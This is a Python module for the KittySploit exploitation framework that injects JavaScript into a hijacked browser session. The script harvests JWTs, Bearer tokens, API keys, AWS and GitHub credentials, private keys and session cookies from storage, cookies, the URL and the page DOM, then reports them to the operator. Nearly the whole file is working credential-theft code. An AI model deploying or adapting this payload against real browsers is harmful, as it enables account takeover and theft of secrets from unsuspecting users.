from kittysploit import *
import json


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Token / Secret Hunter",
		"description": "Hunt JWTs, Bearer tokens, API keys and session secrets across storage, cookies, URL and DOM",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	min_score = OptInteger(40, "Minimum score to report (0-100)", False)
	max_findings = OptInteger(80, "Maximum findings to return", False)
	include_dom = OptBool(True, "Scan inline scripts and meta tags", False)

	def run(self):
		min_score = max(0, min(100, int(self.min_score or 40)))
		max_findings = max(1, int(self.max_findings or 80))
		include_dom = self._to_bool(self.include_dom)

		code_js = f"""
		(function() {{
			const MIN_SCORE = {min_score};
			const MAX_FINDINGS = {max_findings};
			const INCLUDE_DOM = {str(include_dom).lower()};

			const patterns = [
				{{ name: 'jwt', score: 90, re: /\\beyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\b/g }},
				{{ name: 'bearer', score: 85, re: /\\bBearer\\s+[A-Za-z0-9\\-._~+\\/]+=*/gi }},
				{{ name: 'basic_auth', score: 75, re: /\\bBasic\\s+[A-Za-z0-9+\\/=]{{8,}}/gi }},
				{{ name: 'api_key_header', score: 70, re: /(?:api[_-]?key|x-api-key|access[_-]?token|auth[_-]?token)\\s*[:=]\\s*['"]?([A-Za-z0-9_\\-]{{16,}})/gi }},
				{{ name: 'aws_access_key', score: 95, re: /\\bAKIA[0-9A-Z]{{16}}\\b/g }},
				{{ name: 'github_token', score: 95, re: /\\bgh[pousr]_[A-Za-z0-9_]{{20,}}\\b/g }},
				{{ name: 'slack_token', score: 90, re: /\\bxox[baprs]-[A-Za-z0-9-]{{10,}}\\b/g }},
				{{ name: 'google_api', score: 80, re: /\\bAIza[0-9A-Za-z_\\-]{{30,}}\\b/g }},
				{{ name: 'private_key', score: 95, re: /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/g }},
				{{ name: 'session_cookieish', score: 55, re: /(?:session|sess|sid|jsessionid|phpsessid|csrf|xsrf)[=:\\s]+([A-Za-z0-9._\\-]{{12,}})/gi }},
				{{ name: 'uuid_secretish', score: 35, re: /\\b[0-9a-f]{{8}}-[0-9a-f]{{4}}-[1-5][0-9a-f]{{3}}-[89ab][0-9a-f]{{3}}-[0-9a-f]{{12}}\\b/gi }}
			];

			const interestingKeys = /token|auth|session|secret|password|passwd|api[_-]?key|access|refresh|jwt|bearer|csrf|xsrf|credential|oauth|id_token|client_secret/i;

			const findings = [];
			const seen = {{}};

			function clip(v, n) {{
				const s = String(v == null ? '' : v);
				return s.length > n ? s.slice(0, n) + '...' : s;
			}}

			function addFinding(item) {{
				if (!item || item.score < MIN_SCORE) return;
				const key = item.type + '|' + item.source + '|' + item.value;
				if (seen[key]) return;
				seen[key] = true;
				findings.push(item);
			}}

			function scanText(text, source, baseScore) {{
				if (text == null) return;
				const str = String(text);
				if (!str) return;

				patterns.forEach(function(p) {{
					p.re.lastIndex = 0;
					let m;
					while ((m = p.re.exec(str)) !== null) {{
						const value = m[1] || m[0];
						addFinding({{
							type: p.name,
							source: source,
							value: clip(value, 240),
							score: Math.min(100, p.score + (baseScore || 0))
						}});
						if (findings.length >= MAX_FINDINGS) return;
					}}
				}});
			}}

			function scanKeyValue(key, value, source) {{
				const keyBoost = interestingKeys.test(key || '') ? 20 : 0;
				if (keyBoost && value) {{
					addFinding({{
						type: 'interesting_key',
						source: source + '::' + key,
						value: clip(value, 240),
						score: Math.min(100, 50 + keyBoost)
					}});
				}}
				scanText(value, source + (key ? '::' + key : ''), keyBoost);
			}}

			function dumpStorage(store, label) {{
				try {{
					if (!store) return;
					for (let i = 0; i < store.length; i++) {{
						const k = store.key(i);
						scanKeyValue(k, store.getItem(k), label);
					}}
				}} catch (e) {{}}
			}}

			dumpStorage(window.localStorage, 'localStorage');
			dumpStorage(window.sessionStorage, 'sessionStorage');

			try {{
				const cookies = document.cookie || '';
				cookies.split(';').forEach(function(part) {{
					const idx = part.indexOf('=');
					if (idx === -1) return;
					const k = part.slice(0, idx).trim();
					const v = part.slice(idx + 1).trim();
					scanKeyValue(k, v, 'cookie');
				}});
			}} catch (e) {{}}

			try {{
				scanText(window.location.href, 'location.href', 10);
				scanText(window.location.hash, 'location.hash', 15);
				scanText(window.location.search, 'location.search', 15);
			}} catch (e) {{}}

			if (INCLUDE_DOM) {{
				try {{
					document.querySelectorAll('meta[name], meta[property], meta[http-equiv]').forEach(function(meta) {{
						const name = meta.getAttribute('name') || meta.getAttribute('property') || meta.getAttribute('http-equiv') || 'meta';
						scanKeyValue(name, meta.getAttribute('content') || '', 'meta');
					}});
				}} catch (e) {{}}

				try {{
					const scripts = document.querySelectorAll('script:not([src])');
					const limit = Math.min(scripts.length, 40);
					for (let i = 0; i < limit; i++) {{
						const text = scripts[i].textContent || '';
						if (text.length > 200000) continue;
						scanText(text.slice(0, 100000), 'inline_script[' + i + ']', 0);
						if (findings.length >= MAX_FINDINGS) break;
					}}
				}} catch (e) {{}}

				try {{
					document.querySelectorAll('input[type="hidden"], input[name*="token" i], input[name*="csrf" i]').forEach(function(el) {{
						scanKeyValue(el.name || el.id || 'input', el.value || '', 'dom_input');
					}});
				}} catch (e) {{}}
			}}

			findings.sort(function(a, b) {{ return b.score - a.score; }});

			return JSON.stringify({{
				ok: true,
				origin: window.location.origin,
				page_url: window.location.href,
				count: findings.length,
				findings: findings.slice(0, MAX_FINDINGS)
			}});
		}})();
		"""

		result = self.send_js_and_wait_for_response(code_js, timeout=20.0)
		if not result:
			print_error("Failed to run token hunter")
			return False
		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse token hunter response: {exc}")
			print_debug(f"Raw response: {result}")
			return False

		findings = data.get("findings") or []
		print_info("=" * 60)
		print_info("Token / Secret Hunter")
		print_info(f"  Page: {data.get('page_url', '?')}")
		print_info(f"  Findings (>= {min_score}): {len(findings)}")

		if not findings:
			print_status("  No high-value secrets matched")
			return True

		print_info("-" * 60)
		for item in findings:
			score = item.get("score", 0)
			printer = print_warning if score >= 70 else print_info
			printer(
				f"  [{score:>3}] {item.get('type', '?')} @ {item.get('source', '?')}"
			)
			print_info(f"         {item.get('value', '')}")

		high = sum(1 for f in findings if int(f.get("score") or 0) >= 70)
		if high:
			print_success(f"High-confidence hits: {high}")
		return True
